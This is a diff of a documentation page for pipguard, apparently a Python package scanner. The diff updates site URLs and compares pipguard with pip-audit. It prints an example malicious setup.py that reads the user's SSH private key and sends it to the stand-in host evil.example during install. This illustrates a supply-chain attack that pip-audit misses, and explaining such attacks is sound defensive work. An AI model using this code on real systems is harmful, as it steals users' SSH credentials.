@@ -10,7 +10,7 @@
       
       
       
-        <link rel="canonical" href="https://shenxianpeng.github.io/pipguard/zh/comparison/">
+        <link rel="canonical" href="https://shenxianpeng.dev/pipguard/zh/comparison/">
       
       
         <link rel="prev" href="../how-it-works/">
@@ -1014,11 +1014,11 @@ And pipguard <em>also</em> runs the known-CVE check (via OSV, the same data pip-
 uses) with <code>--check-vulns</code>.</p>
 <h2 id="the-evidence">The evidence<a class="headerlink" href="#the-evidence" title="Permanent link">&para;</a></h2>
 <p>A package whose <code>setup.py</code> steals your SSH key during install — the
-<a href="https://shenxianpeng.github.io/pipguard/how-it-works/">litellm</a>-class attack:</p>
+<a href="https://shenxianpeng.dev/pipguard/how-it-works/">litellm</a>-class attack:</p>
 <div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># evilpkg/setup.py</span>
 </span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib.request</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s2">&quot;~/.ssh/id_rsa&quot;</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s2">&quot;https://evil.example/collect&quot;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s2">"~/.ssh/id_rsa"</span><span class="p">))</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="s2">"https://evil.example/collect"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
 </span></code></pre></div>
 <div class="language-console highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="gp">$ </span>pip-audit<span class="w"> </span>./evilpkg
 </span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="go">No known vulnerabilities found</span>
